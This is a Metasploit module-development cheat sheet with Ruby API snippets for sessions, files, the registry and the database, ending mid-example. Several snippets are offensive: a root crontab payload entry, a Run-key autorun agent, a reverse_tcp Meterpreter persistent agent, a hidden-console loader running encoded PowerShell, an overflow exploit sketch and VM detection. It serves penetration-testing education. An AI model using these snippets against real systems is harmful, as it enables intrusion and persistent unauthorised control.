
## METASPLOIT API CHEAT SHEET

<blockquote>The objective of this cheat sheet is to describe some common API technics for some of the various components of the Metasploit Framework, to assiste developers into writing metasploit modules. It is worthy to note that the Metasploit has<br />a full-featured Ruby client API Documentation: https://www.rubydoc.info/github/rapid7/metasploit-framework/index</blockquote>

![pic](http://i68.tinypic.com/21ovkfm.jpg)

| article chapters | jump links | API examples |
|-------|---|---|
| metasploit skeleton | [requires-includes-info](https://github.com/r00t-3xp10it/hacking-material-books/blob/master/metasploit-RC%5BERB%5D/metasploit-API/my-API-Cheat-sheet.md#metasploit-skeleton) | include Msf::Post::Linux::System |
| Print on terminal | [print messages on terminal](https://github.com/r00t-3xp10it/hacking-material-books/blob/master/metasploit-RC%5BERB%5D/metasploit-API/my-API-Cheat-sheet.md#print-messages-on-terminal) | print_error("Target its not compatible with this module.") |
| execute remote commands | [executing remote commands](https://github.com/r00t-3xp10it/hacking-material-books/blob/master/metasploit-RC%5BERB%5D/metasploit-API/my-API-Cheat-sheet.md#execute-remote-commands) | cmd_exec("chmod 777 #{random_file_path}") |
| stdapi operations | [stdapi operations](https://github.com/r00t-3xp10it/hacking-material-books/blob/master/metasploit-RC%5BERB%5D/metasploit-API/my-API-Cheat-sheet.md#stdapi-operations) | if client.fs.file.writable?("%tmp%") |
| checking target arch | [checking target system arch](https://github.com/r00t-3xp10it/hacking-material-books/blob/master/metasploit-RC%5BERB%5D/metasploit-API/my-API-Cheat-sheet.md#check-target-arch) | unless session.platform.include?("linux") |
| listing remote processes | [listing remote processes](https://github.com/r00t-3xp10it/hacking-material-books/blob/master/metasploit-RC%5BERB%5D/metasploit-API/my-API-Cheat-sheet.md#listting-remote-processes) | session.sys.process.get_processes().each do \|x\| |
| manipulate registry | [manipulate regedit (remote)](https://github.com/r00t-3xp10it/hacking-material-books/blob/master/metasploit-RC%5BERB%5D/metasploit-API/my-API-Cheat-sheet.md#manipulate-regedit) | registry_getvaldata('HKCU\Control Panel','Title') |
| various checks | [various checks ](https://github.com/r00t-3xp10it/hacking-material-books/blob/master/metasploit-RC%5BERB%5D/metasploit-API/my-API-Cheat-sheet.md#various-checks) | client.framework.exploits.create("multi/handler") |
| ruby string manipulation | [ruby string manipulation](https://github.com/r00t-3xp10it/hacking-material-books/blob/master/metasploit-RC%5BERB%5D/metasploit-API/my-API-Cheat-sheet.md#ruby-string-manipulation) | parse = datastore['remote_path'].gsub('\\','\\\\') |
| store loot | [store loot (local)](https://github.com/r00t-3xp10it/hacking-material-books/blob/master/metasploit-RC%5BERB%5D/metasploit-API/my-API-Cheat-sheet.md#store-loot) | tbl = Rex::Ui::Text::Table.new('') |
| writting exploits | [writting exploits (C-VBS)](https://github.com/r00t-3xp10it/hacking-material-books/blob/master/metasploit-RC%5BERB%5D/metasploit-API/my-API-Cheat-sheet.md#writing-exploits) | exeTEMPLATE = %{ #include <stdio.h> }, |
| discover system language | [discover language (regedit)](https://github.com/r00t-3xp10it/hacking-material-books/blob/master/metasploit-RC%5BERB%5D/metasploit-API/my-API-Cheat-sheet.md#discover-system-language) | client.sys.config.sysinfo['System Language'] |

<br />

## EXTERNAL LINKS

- [Execute Ruby Online (Ruby v2.4.1)](https://www.tutorialspoint.com/execute_ruby_online.php)
- [Rapid7 metasploit-framework API Documentation](http://www.rubydoc.info/github/rapid7/metasploit-framework/index)
- [Metasploit-unleashed Writing_Meterpreter_Scripts](http://www.offensive-security.com/metasploit-unleashed/Writing_Meterpreter_Scripts)
- [Rapid7 get started with writing an auxiliary module](https://github.com/rapid7/metasploit-framework/wiki/How-to-get-started-with-writing-an-auxiliary-module)
- [r00t-3xp10it writing_a_linux_post_module_from_scratch](https://github.com/r00t-3xp10it/hacking-material-books/blob/master/metasploit-RC%5BERB%5D/metasploit-API/writing_a_linux_post_module_from_scratch.md)
- [digitalocean how to work with strings methods in ruby](https://www.digitalocean.com/community/tutorials/how-to-work-with-string-methods-in-ruby)

---

<br /><br /><br /><br />

## METASPLOIT SKELETON

- **Metasploit skeleton - Linux (requires|includes)**<br />
<blockquote>**rex** is the basic library for most tasks: Handles sockets, protocols, text transformations, SSL, SMB, XOR, Base64.<br />**msf/core** will include all the functionalities from the core library. the framework’s core library is the low-level interface that provides the required functionality for interacting with exploit modules, sessions, plugins, encoders, libs, etc.<br />**msf/core/post/common** allow us to use cmd_exec() to execute commands on remote system (linux or windows).</blockquote>

      require 'rex'
      require 'msf/core'
      require 'msf/core/post/common'

        class MetasploitModule < Msf::Post

        include Msf::Post::File
        include Msf::Post::Linux::Priv
        include Msf::Post::Linux::System

<br />

- **Metasploit skeleton (initialize method)**<br />
<blockquote>This initialize method is basically boilerplate code that tells metasploit information about your module so it can<br />display said information to users inside the metasploit console. It can also be used to config module internal settings.</blockquote>

        def initialize(info={})
          super(update_info(info,
            'Name'         => "SCRNSAVE T1180 (User-land Persistence)",
            'Description'  => %q{
               To achieve persistence the attacker can modify 'SCRNSAVE.EXE' value in the registry.
          },
            'License'      => MSF_LICENSE,
            'Platform'     => ['windows'],
            'SessionTypes' => ['meterpreter'],
            'Author'       => [
              'Pedro Ubuntu [r00t-3xp10it]',
            ]
        ))
        end

<br />

- **Metasploit skeleton (register_options method)**<br />
<blockquote>This method adds options that the user can specify before running the module.<br />The OptBool.new() API accepts bollean values (1 or 0 - true or false) to be inputed manually by user<br />The OptString.new() API accepts string values (text-numbers-symbols) to be inputed manually by user</blockquote>

        register_options(
          [
            OptBool.new('SESSION', [ true, 'The session number to run this module on', 1]),
            OptString.new('APPL_PATH', [ true, 'Set absoluct path of malicious PE/Appl to run'])
          ], self.class)
        end

<br />

- **Metasploit skeleton (def run method)**<br />
<blockquote>This is where your code goes! This is also where metasploit ends and good-old-ruby begins.</blockquote>
      
        def run
          print_status("exploiting target machine")
          output = cmd_exec("whoami")
          print_line("#{output}")
        end

#### [!] [Jump to article index](https://github.com/r00t-3xp10it/hacking-material-books/blob/master/metasploit-RC%5BERB%5D/metasploit-API/my-API-Cheat-sheet.md#metasploit-api-cheat-sheet)

---

<br /><br /><br />

## PRINT MESSAGES ON TERMINAL

- **print blue color**

      print_status("module normal functions working.")

- **print green color**

      print_good("Target #{arch} its compatible with this module")

- **print red color**

      print_error("Target #{arch} its not compatible with this module")

- **print yellow color**

      print_warning("Aborting, module can't determine target arch.")

- **print line**

      print_line("Hello from a metasploit session at #{Time.now}")

- **print data onscreen**

      data = "print onscreen"
      print_good(data)
      print_warning("another way to: ", data)
      print_warning("yet another way to: #{data}")

#### [!] [Jump to article index](https://github.com/r00t-3xp10it/hacking-material-books/blob/master/metasploit-RC%5BERB%5D/metasploit-API/my-API-Cheat-sheet.md#metasploit-api-cheat-sheet)

---

<br /><br /><br />

## EXECUTE REMOTE COMMANDS

- **execute one command and display results**

      output = cmd_exec("whoami")
      print_good("whoami: #{output}")

- **execute bash commands (/bin/sh)**

      cmd_exec("sh /root/test.sh")
      cmd_exec("mkdir -m 700 -p /root/test.s")

- **Execute remote command (windows)**

      proc = session.sys.process.execute("cmd.exe /c start calc.exe", nil, {'Hidden' => true})

- **Use backslash(s) to escape special caracters [ "*\$! ]**

      proc = session.sys.process.execute("cmd.exe /c sc create #{sname} bin= \"C:\\Users\\Desktop\\fg.exe\"", nil, {'Hidden' => true})

- **The shell.read() method provides the ability to read output from a shell session.**

      session.shell_read("/etc/crontab")

- **session.shell_upgrade will attempt to spawn a new Meterpreter session through an existing Shell session.**<br />
'This requires that a multi/handler be running and that the host and port of this handler is provided to this method.'

      session.shell_upgrade

- **Executing a shell command (not meterpreter)**

      session.shell_command("echo \"* * * * * root /root/payload.sh\" >> /etc/crontab")
      session.shell_command("service cron reload")

- **elevate session privileges before running module**<br />
'remmenber that **end** closes loop functions.'

      client.sys.config.getprivs.each do |priv|
      end

#### [!] [Jump to article index](https://github.com/r00t-3xp10it/hacking-material-books/blob/master/metasploit-RC%5BERB%5D/metasploit-API/my-API-Cheat-sheet.md#metasploit-api-cheat-sheet)

---

<br /><br /><br />

## STDAPI OPERATIONS

- **simple read file**

      output = read_file("/proc/scsi/scsi")
      print_status("contents: #{output}")

- **delete remote file (windows)**

      client.fs.file.rm("c:\\oldman\\file.txt")

- **rename file**

      client.fs.file.mv("C:\\oldname","C:\\newname")

- **check if file its writable**

      client.fs.file.writable?("C:\\Users\\pedro\\Desktop")

- **check if a file its executable**

      client.fs.file.executable?("C:\\Users\\pedro\\Desktop\\payload.exe")

- **make a directory named "oldman"**

      client.fs.dir.mkdir("c:\\oldman")

- **delete remote directory**

       client.fs.dir.delete("c:\\oldman")

- **Search for the specified file**<br />
'This will search for hacking.txt in the oldman directory and its **subdirectories**'

      client.fs.file.search("c:\\oldman","hacking.txt")

- **Check if specified file exists**

      client.fs.file.exists?("c:\\oldman\\file.txt")

- **Download file from target system**<br />
'This will download dum.txt from taget and save it to attackers root directory'

      client.fs.file.download("/root/dum.txt","%temp%\\dum.txt")

- **upload file to target system**<br />
'This will upload dum.txt from attacker system and save it to target root directory'

      client.fs.file.upload("C:\\Users\\pedro\\Desktop\\dum.txt","/root/dum.txt")

- **random filename (8 caracters)**

      rand = Rex::Text.rand_text_alpha(8)+".log"
      print_good("#{rand} file created")

- **Read target environment variables to extact username**

      user_name = client.fs.file.expand_path("%USERNAME%")
      print_good("target user name: #{user_name}")

- **This method will list all active sessions in the framework instance.**

      session.list

- **Get current working directory**

      client.fs.dir.pwd

- **Get Client UID**

      client.sys.config.getuid

- **Get target system ip address**

      client.session_host

- **Get target client process pid**

      client.sys.process.getpid

- **Get target system architecture**

      arch = session.sys.config.sysinfo
      print_good("arch: #{arch['Architecture']}")

- **write to a local file**

      File = file.open("/root/test", "w")
      File.write("sc create #{sname} binpath= \"C:\\Users\\Desktop\\test.exe\" start= auto") 
      File.close

- **write file with multiple lines (oneliner)**

      File.open("/root/hello.sh", "w") {|f| f.write("#!/bin/sh\necho 'hello iam 1º line'\necho 'hello iam the 2º line'\nsleep 3\nexit") }

- **write to remote file**

      rc_full_path = "/root/ip.sh"
        con_rc << "#!/bin/sh\n"
        con_rc << "ifconfig wlan0"
        file_write(rc_full_path, con_rc)
      print_line("Writing Console RC file to #{rc_full_path}")

- **write to remote file**

      dll_data =
        "#!/bin/sh" +
        "xwd -root-out /tmp/screen.xwd" +
        "exit"
  
      dllpath = "/tmp/screen.xwd"
        fd = session.fs.file.new(dllpath, 'wb')
        fd.write(dll_data)
        fd.close
      print_status("Uploaded the persistent agent to #{dllpath}")

- **write to remote file**

      tempdir = client.fs.file.expand_path("%TEMP%")
        tempvbs = tempdir + "\\" + Rex::Text.rand_text_alpha((rand(8)+6)) + ".vbs"
        fd = client.fs.file.new(tempvbs, "wb")
        fd.write(vbs)
        fd.close
      print_status("Uploaded the persistent agent to #{tempvbs}")

- **Open a file in read mode and copy the content to some variable**<br />
'This will copy all the data inside dum.txt and store it in vtemp variable'

      file1 = client.fs.file.new("C:\\Users\\pedro\\Desktp\\dum.txt")
        vtemp = ""
        until file1.eof?
        vtemp << file_object.read
      end

- **List all the available interfaces from victims system**<br />
comment: This will return an array of the first interface available in the victims<br />
system along with the details like IP, netmask, mac_address etc.

      vtemp = "client.net.config.get_interfaces"
      print_good("Interfaces: #{vtemp}")

#### [!] [Jump to article index](https://github.com/r00t-3xp10it/hacking-material-books/blob/master/metasploit-RC%5BERB%5D/metasploit-API/my-API-Cheat-sheet.md#metasploit-api-cheat-sheet)

---

<br /><br /><br />

## CHECK TARGET ARCH

- **check FOR proper operative System**

      if session.platform == 'windows'
      unless session.platform.include?("linux")

- **check FOR proper operative System (windows-not-wine)**

      oscheck = client.fs.file.expand_path("%OS%")
      if not oscheck == "Windows_NT"
        print_error("[ ABORT ]: This module only works againts windows systems")
        return nil
      end

- **check FOR operative System compatible**

      unless sysinfo['OS'] =~ /Windows (xp|vista|9|10)/
        print_error("[ ABORT ]: This module only works againt windows systems.")
        return nil
      end

- **determine target compsec arch (x86|x64)**

      sysarch = sysinfo['Architecture']
        if sysarch == ARCH_X86
          target_compspec = "C:\\Windows\\system32\\cmd.exe"
        else
          target_compspec = "C:\\Windows\\SysWow64\\cmd.exe"
        end

- **determine target distro (linux)**

      target_info = cmd_exec('uname -ms')
      if target_info =~ /linux/ || target_info =~ /Linux/
        print_status("Platform: Linux")
      end


- **another target System check method (windows)**

      def check
        vulnerable = []
          winver = sysinfo["OS"]
          affected = [ 'Windows Vista', 'Windows 7', 'Windows 2008' ]
            affected.each { |v|
              if winver.include? v
                vulnerable = true
              else
                vulnerable = false
            break
          end
      end

- **Check if we are running in an higth integrity context (root)**<br />
'uid=0 OR root (linux based distos)'

      target_uid = client.sys.config.getuid
      unless target_uid =~ /uid=0/ || target_uid =~ /root/
        print_error("[ABORT]: root access is required in target system ..")
        return nil
      end


#### [!] [Jump to article index](https://github.com/r00t-3xp10it/hacking-material-books/blob/master/metasploit-RC%5BERB%5D/metasploit-API/my-API-Cheat-sheet.md#metasploit-api-cheat-sheet)

---

<br /><br /><br />

## LISTTING REMOTE PROCESSES

- **List remote processes**<br />
'We can access the list of processes from **session.sys.process()** using 'get_processes' method'.

      if listprocesses == TRUE
        print_status('Process list:')
          print_line('')
          session.sys.process.get_processes().each do |x|        
            print_good("#{x['name']} [#{x['pid']}]")
          end
            print_line('') 
        end

- **List processes (get process by name)**

      def get_winlogon
        session.sys.process.get_processes().each do |x|
          if x['name'].downcase == "winlogon.exe"
            print_good("process found ..")
          end
        end
      end

#### [!] [Jump to article index](https://github.com/r00t-3xp10it/hacking-material-books/blob/master/metasploit-RC%5BERB%5D/metasploit-API/my-API-Cheat-sheet.md#metasploit-api-cheat-sheet)

---

<br /><br /><br />

## MANIPULATE REGEDIT

- **Checks if a key exists on the target registry**

      data = registry_key_exist?('HKCU\Control Panel\Desktop','ScreenSaveActive')
        unless data.nil? || data.empty?
        print_good("value: ScreenSaveActive found in regedit.")
      end

- **Read remote registry key and store results in local var**

      data = registry_getvaldata('HKCU\Control Panel\Desktop','ScreenSaveActive')
      print_good("ScreenSaveActive: #{data}")

- **Enumerate regedit remote hives**

      if registry_enumkeys("HKCU\\Software\\Microsoft\\Office")
        print_good("Remote registry hive [office] found ..")
      else
        print_error("Remote registry hive [office] NOT found ..")
      end

- **Check for office version installed using registry**

      if registry_enumkeys("HKCU\\Software\\Microsoft\\Office\\10.0")
        data = "10.0"
      elsif registry_enumkeys("HKCU\\Software\\Microsoft\\Office\\11.0")
        data = "11.0"
      elsif registry_enumkeys("HKCU\\Software\\Microsoft\\Office\\12.0")
        data = "12.0"
      end
      print_good("Microsoft office version: #{data}")

- **write reg key using meterpreter prompt**

      reg setval -k "HKCU\\Control Panel\\Desktop" -v ScreenSaveActive -t REG_SZ -d 1

- **write reg key remote using cmd_exec()**

      cmd_exec("REG ADD HKCU\\Contol Panel\\Desktop /v ScreenSaveActive /t REG_SZ /d 1 /f")

- **write reg key remote using .process.execute()**<br />
'execute cmd prompt in a **hidden** channelized windows'

      cmd = "HKCU\\Contol Panel\\Desktop /v ScreenSaveActive /t REG_SZ /d 1 /f"
      r = session.sys.process.execute("cmd.exe /c REG ADD #{cmd}", nil, {'Hidden' => true, 'Channelized' => true})
      print_warning("Hijack key: #{cmd}")

- **write reg key remote (msf API)**

      rand = Rex::Text.rand_text_alpha(rand(8)+8)
      print_status("Installing into autorun as HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\#{rand}")
      key = client.sys.registry.open_key(HKEY_LOCAL_MACHINE, 'Software\Microsoft\Windows\CurrentVersion\Run', KEY_WRITE)
        if(key)
          key.set_value(nam, session.sys.registry.type2str("REG_SZ"), tempvbs)
          print_status("Installed into autorun as HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\#{rand}")
        else
          print_status("Error: failed to open the registry key for writing")
        end
      end

#### [!] [Jump to article index](https://github.com/r00t-3xp10it/hacking-material-books/blob/master/metasploit-RC%5BERB%5D/metasploit-API/my-API-Cheat-sheet.md#metasploit-api-cheat-sheet)

---

<br /><br /><br />

## VARIOUS CHECKS

- **check to see if a string is empty**

      name = ""
      name.empty?    # true

      name = "Sammy"
      name.empty?    # false

      name = "     "
      name.empty?    # false

- **check if string its empty**

      name = ""
      if name.nil? || name.empty?|| name == '' || name == ' '

      output: true

- **check if remote file exists (windows)**

      print_warning("checking file existance")
      path="C:\\Windows\\system32\\ola.txt"
        if session.fs.file.exist?(path)
          print_good("path: #{path} found ..")
        end

- **check IF application exists (linux)**

      if exists_exe?("wget")
        print_good("wget available, using it ..")
      end

- **check IF directory exists ?????**

      get_path = "C:\\windows"
        if session.fs.dir.exist?(get_path) # error ?? why ???
          print_good('Vuln path exists')
        else
          print_error("#{get_path} doesn't exist on target")
      end

- **check IF directory exists (local)**

      get_path = "/root/payload.sh"
      unless File.directory?(get_path)
        print_error("Remote path: #{get_path} not found ..")
        return nil
      end

- **check IF string inputed contains \\ .**

      app_path = "C:\windows\system32\calc.exe"
      if app_path.include? "\\"

- **check IF string does NOT contains any \\ .**

      app_path = "C:\windows\system32\calc.exe"
      unless app_path.include? "\\"

- **check if we are in a meterpreter session**

      if not sysinfo.nil? or sysinfo == ''
        print_status("Running module against #{sysnfo['Computer']}")
      end

- **check if we are in a meterpreter session**

      if session.type == "meterpreter"
        print_good("we are running a meterpreter session")
      end

- **check if sessions its admin**

      isadd = is_admin?
      if(isadd)
        print_line('we are admin') 
      else
        print_line('not admin access level') 
      end

- **check if sessions its system**

      issys = is_system?
      if(issys)
        print_line('we are system') 
      else
        print_line('not a system access level') 
      end

- **Get target host name**

      def get_host
        case session.type
        when /meterpreter/
          host = sysinfo["Computer"]
        when /shell/
          host = cmd_exec("hostname").chomp
        end
        print_status("Running module against #{host}")
        return host
      end

- **determine if MinGW has been installed, support new and old MinGW system paths**

      mingw = true if File::exists?('/usr/i586-mingw32msvc') || File::exists?('/usr/bin/i586-migw32msvc')
      if mingw == false
        print_error("[*] You must have MinGW-32 installed in order to compile EXEs!!")
        return nil
      end

- **determine if we are in a VM System (windows)**

      if registry_getvaldata('HKLM\HARDWARE\DESCRIPTION\System','SystemBiosVersion') =~ /vbox/i
        vm = true
        box = "vbox"
      end

      if not vm
        srvvals = registry_enumkeys('HKLM\SYSTEM\ControlSet001\Services')
          if srvvals and srvvals.include?("VBoxMouse")
            vm = true
            box = "VBoxMouse"
          elsif srvvals and srvvals.include?("VBoxGuest")
            vm = true
            box = "VBoxGuest"
          elsif srvvals and srvvals.include?("VBoxService")
            vm = true
            box = "VBoxService"
          elsif srvvals and srvvals.include?("VBoxSF")
            vm = true
            box = "VBoxSF"
          end
      end

      if vm == true
        print_warning("value: #{box}")
      end

- **Check msf database for hosts (address) and ports (port)**

           xhost = framework.db.hosts.map(&:address).join(' ')
           print_status("## Targets found: #{xhost} found")

           output: ## Tagets found: 192.168.1.71 192.168.1.253 192.168.1.254



           flavor = framework.db.hosts.map(&:os_flavor).join(' ').gsub(' ',', ')
           print_status("## Targets found: #{flavor} found")

           output: ## Targets found: windows, linux



           fexploit = framework.db.services.map(&:port).join(' ')
           if fexploit =~ /80/i
                print_status("## Targets port: #{fexploit} found")
           end

           output: ## Targets port: 80 445 139

- **Read rhosts from database**

            # main loop, where we connect to each host
            # and try to add our user to the required group
            hosts.each do |rhost|
               run_single("set RHOSTS #{rhost}")
               run_single("exploit")
            end

- **loop function to extract info from database**

```
      framework.db.hosts.each do |host|
         framework.db.services.each do |serv|
	      print_line("IP: #{host.address}")
              print_line("OS: #{host.os_name}")
              print_line("Servicename: #{serv.name}")
              print_line("Service Port: #{serv.port.to_i}")
              print_line("Service Protocol: #{serv.proto}")
              print_line("")
         end
      end
```

- **Check if database its connected**

```
    if not framework.db.active
      print_error("Database not connected")
      return nil
    else
      print_good("Database connected")
    end

```
- **check if redteam workspace exists**

```
ck_team = framework.db.workspaces.map(&:name).join(' ')
   if ck_team =~ /redteam/i
      print_good("redteam workspace found")
   else
      print_error("redteam workspace not found")
   end

```

- **check what workspace its active.**

```
    ds = framework.db.workspace.name
    print_status("Current workspace: #{ds}")
    Rex::sleep(1.0)

    output: default
```

- **Get user imputs inside msfconsole**

```
   print_status("Input LHOST:")
      addr = gets.chomp
      print_good("set LHOST #{addr}")
```

- **Query framework.sessions api**

```
<ruby>
# 0 == none session active
if (framework.sessions.length > 0)
     print_status("Active sessions found")
    ## check for session ID
    framework.sessions.each_key do |sid|
        print_status("ID: #{sid}")
            ## Check for RHOST and RPORT
            session = framework.sessions[sid]
            xhost = session.tunnel_peer.split(':')[0]
            xport = session.tunnel_peer.split(':')[1]
            print_status("RHOST: #{xhost}")
            print_status("RPORT: #{xport}")
            ## Check RHOST platform (session.platform)
            if (session.platform =~ /Windows/i)
                print_good("TARGET: #{xhost} - Windows platform detected")
            elsif (session.platform =~ /Linux/i)
              	print_good("TARGET: #{xhost} - Linux platform detected")
            else
               	print_error("TARGET: #{xhost} - platform NOT detected")
            end
    end
end

## prompt:: msf >
run_single("back")
</ruby>

```

#### [!] [Jump to article index](https://github.com/r00t-3xp10it/hacking-material-books/blob/master/metasploit-RC%5BERB%5D/metasploit-API/my-API-Cheat-sheet.md#metasploit-api-cheat-sheet)

---

<br /><br /><br />

## RUBY STRING MANIPULATION

- **Using .slice() to extract chars**
<blockquote>The slice method lets you grab a single character or a range of characters. Passing a single integer returns the character at that index. Passing two integers, separated by a comma, tells slice to return all the characters from the first index to the last index, inclusive. The slice method also accepts a range, such as 1..4, to specify the characters to extract:</blockquote>

      s = "Sammy"
      s.slice(0)     # "s"
      s.slice(1,2)   # "am"
      s.slice(1..4)  # "ammy"

- **delete last 3 chars from string**

      remote_path = "/tmp/payload.sh"
      mask = remote_path.slice(0..-4)
      print_good("#{mask}")

      output: /tmp/payload

- **use .chomp() to delete last char from a string**

      s = "hello"
      s.chomp('o')

      output: hell

- **Use .chomp() method to remove multiple characters from the string**

      s = "hello"
      s.chomp("el")

      output: ho

- **The index method returns the index of a string**<br />
'The index method only finds the **first occurrance** though'

      s = "hello"
      s.index("e")

      output: 2

      s.index("o")
      output: 5

      s.index("Fish")
      output: nil

- **join strings together with .concat()**

      s = "hello"
      s.concat(" world")

      output: hello world

- **string manipulation using .delete() and +**

      remote_path = "/tmp/payload.sh"
      rem = remote_path.delete(".sh")
      mask = rem + "/cron"
      puts mask

      output: /tmp/payload/cron

- **string manipulation using .delete() and .insert()**

      remote_path = "/tmp/payload.sh"
      rem = remote_path.delete(".sh")
      mask = rem.insert(12,"/cron")
      puts mask

      output: /tmp/payload/cron

- **string manipulation (count chars in string)**

      remote_path = "/tmp/payload.sh"
      rem = remote_path.length
      puts rem

      output: 15

- **string manipulation (count chars in string)**

      remote_path = "/tmp/payload.sh"
      rem = remote_path.length
        if remote_path.length > 10
          puts "supplied path its higher than 10 chars long"
        elsif remote_path.length == 10
          puts "supplied path its 10 chars long"
        else
          puts "supplied path its smaller than 10 chars long"
        end

      output: supplied path its higher than 10 chars long

- **string manipulation (subtitute chars global)**

       remote_path = "/tmp/payload.sh"
       rem = remote_path.gsub("a","0")
       puts rem

       output: /tmp/p0ylo0d.sh

- **string manipulation (substitute 1º occurencie)**

       remote_path = "/tmp/payload.sh"
       rem = remote_path.sub("a","0")
       puts rem

       output: /tmp/p0yload.sh

- **substitution of chars using .gsub()**

      app_path = 'C:\windows\system32\calc.exe'
      print_warning("path: #{app_path}")
      print_line("-------------------")

        if app_path.include? "\\"
          final = app_path.gsub('\\', '\\\\\\')
          print_good("final path: #{final}")
        end

      output: C:\\windows\\system32\\calc.exe

- **delete chars from var declarations**

      char = datastore['shellcode'] # '\xfc\xfd\x00'
      output = char.delete "\\"

      output: xfcxfdx00

- **join strings (concaternation)**

      values = ["pow", "ers", "hell"]
      result = values.join
      print_good("concaternate: #{result}")

      output: powershell

- **Check if last string prefix corresponds to ubuntu string**<br />
'we can use the **end_with?** method to check if a string ends with a specific string'.

      text = "pedro ubuntu r00t-3xp10it"
      final = text.end_with?("ubuntu")
        if final == true
          puts true
      else
          puts false
      end

      output: false

- **use .split(' ') [empty space delimiter]**

      values = "pedro ubuntu"
      parse = values.split(' ')
      print_status("output: #{parse}")

      output:
        pedro
        ubuntu

- **use .split() to extract only the field we want (2º string inside array)**<br />
'Remmenber that ruby array index(s) starts in: [0][1][2]'

      values = "pedro ubuntu r00t-3xp10it"
      parse = values.split(' ')[2]

      output: r00t-3xp10it

- **use .split() and / as delimiter and print 2º ocurrence**

      remote_path = "/tmp/payload.sh"
      final = remote_path.split('/')[2]
      print_good("#{final}")

      output: payload.sh

- **count number of / and print the last occurence (field)**

      remote_path = "/tmp/ola/payload.sh"

        # count nº of / and print only last field
        if remote_path.count('/') == 1
          payload_name = remote_path.split('/')[1]
        elsif remote_path.count('/') == 2
          payload_name = remote_path.split('/')[2]
        elsif remote_path.count('/') == 3
          payload_name = remote_path.split('/')[3]
        end

      # print onscreen
      puts payload_name


      output: payload.sh

- **count number of / and replace the payload name in absoluct path**

      remote_path = "/tmp/ola/payload.sh"

        # count nº of / and store only last field
        if remote_path.count('/') == 1
          payload_name = remote_path.split('/')[1]
        elsif remote_path.count('/') == 2
          payload_name = remote_path.split('/')[2]
        elsif remote_path.count('/') == 3
          payload_name = remote_path.split('/')[3]
        end

        # replace payload name in absoluct path
        final_path = remote_path.sub("#{payload_name}",'crond')

      # print onscreen
      puts "payload name: #{payload_name}"
      puts "final path  : #{final_path}"


      output:
        payload name: payload.sh
        final name  : /tmp/ola/crond

- **Returns the first 8 characters of a string**<br />
'If a limit is supplied(8) returns a substring fom the beggining of string until it reaches the limit value'

      remote_path = "/tmp/ola/payload.sh"
      parse = remote_path.first(8)

      output: /tmp/ola


- **Returns the last 10 characters of a string**<br />
'If a limit is supplied(10) returns a substring fom the beggining of string until it reaches the limit value'

      remote_path = "/tmp/ola/payload.sh"
      parse = remote_path.last(10)

      output: payload.sh

- **Use .last together with .split('/') [delimiter] to extact the last index from string**<br />
<blockquote>This next example uses / as delimiter to build an array list, then the .first method extracts the first index of that array<br />or the .last method extracts the last index of that array list. Then we use .sub() method to replace the last index of array.</blockquote>

      remote_path = "/tmp/ola/payload.sh"
      chars = remote_path.split('/')

        puts "My array is: #{chars}"
        puts "the first index is: #{chars.first}"
        puts "Your last index is: #{chars.last}"

          # replace payload name in absoluct path
          final_path = remote_path.sub("#{chars.last}",'crond')
        print_good("final path is: #{final_path}")

      output: My array is: ["tmp", "ola", "payload.sh"]
      output: the first index is: tmp
      output: Your last index is: payload.sh
      output: final path is: /tmp/ola/crond

#### [!] [Jump to article index](https://github.com/r00t-3xp10it/hacking-material-books/blob/master/metasploit-RC%5BERB%5D/metasploit-API/my-API-Cheat-sheet.md#metasploit-api-cheat-sheet)

---

<br /><br /><br />

## STORE LOOT

- **store data in loot folder (local)**

      if datastore['STORE_LOOT'] == true
        data_entry = cmd_exec("ifconfig")
        store_loot("ifconfig", "text/plain", session, data_entry, "output.txt", "output of ifconfig command")
      end

- **Build your own logfile with random name**

      data_entry = []
      rand = Rex::Text.rand_text_alpha(5)
        data_entry << "# kali_initd_persistence\n"
        data_entry << "####\n"
        data_entry << "service: crontab\n"
        data_entry << "service path: /etc/crontab\n"
        data_entry << "payload: /root/payload.sh"
      store_loot("persistence_#{rand}", "text/plain", session, data_entry, "persistence_#{rand}.txt", "persistence_#{rand}")
      print_warning("logfile stored: ~/.msf4/loot/persistence_#{rand}.txt")
      Rex::sleep(1.0)

- **Build your own logfile with random name (local)**

      f = []
      rand = Rex::Text.rand_text_alpha(5)
      loot_folder = datastore['LOOT_FOLDER']
      File.open("#{loot_folder}/revert_#{rand}.rc", "w") do |f|
        f.write("# kali_initd_persistence\n")
        f.write("####\n")
        f.write("service: crontab\n")
        f.write("service path: /etc/crontab\n")
        f.write("payload: /root/payload.sh")
        f.close
      end
      print_warning("logfile stored: #{loot_folder}/revert_#{rand}.rc")


- **display report note to attacker**

      output = client.fs.file.expand_path("%SYSTEMDRIVE%")
      report_note(
        :host_name => session,
        :type      => "windows.system.path",
        :data      => output,
        :update    => :unique_data
        )
      print_status("System info gather ..")

#### [!] [Jump to article index](https://github.com/r00t-3xp10it/hacking-material-books/blob/master/metasploit-RC%5BERB%5D/metasploit-API/my-API-Cheat-sheet.md#metasploit-api-cheat-sheet)

---

<br /><br /><br />

## WRITING EXPLOITS

- **This is my imaginary exploit in ruby**

      include Msf::Exploit::FILEFORMAT
      buf = ""
      buf << "A" * 1024
      buf << [0x40201f01].pack("V")
      buf << "\x90" * 10
      buf << payload.encoded
      file_create(buf)

- **build vbs script**

      print_status("Creating a persistent agent: LHOST=#{rhost} LPORT=#{rport} (interval=#{delay} onboot=#{install})")
      pay = client.framework.payloads.create("windows/meterpreter/reverse_tcp")
      pay.datastore['LHOST'] = rhost
      pay.datastore['LPORT'] = rport
      raw  = pay.generate
      vbs = ::Msf::Util::EXE.to_win32pe_vbs(client.framework, raw, {:persist => true, :delay => 5})
      print_status("Persistent agent script is #{vbs.length} bytes long")

- **BUILD C template**

```
      exeTEMPLATE = %{
        #include <stdio.h>
        #include <windows.h>
          int shellCode(){
	    system("color 63");
	    system("powershell -nop -win Hidden -noni -enc #{powershell_encoded}"); 
	  /*
            ((Shell Code into the console))
	  */
	return 0;
        }

      void hide(){
	HWND stealth;
	AllocConsole();
	stealth = FindWindowA("ConsoleWindowClass",NULL);
	ShowWindow (stealth,0);
      }

      int main(){
	hide();
	shellCode();
	return 0;
        }
      },

      # write C template to a file
      file_temp = File.new("temp.c", "w")
      file_temp.write(exeTEMPLATE)
      file_temp.close
```

- **This sample demonstrates how a file can be encoded using a framework encoder.**

      require ’msf/base’
      $:.unshift(File.join(File.dirname(__FILE__), ’..’, ’..’, ’..’,’lib’))
      if (ARGV.empty?)
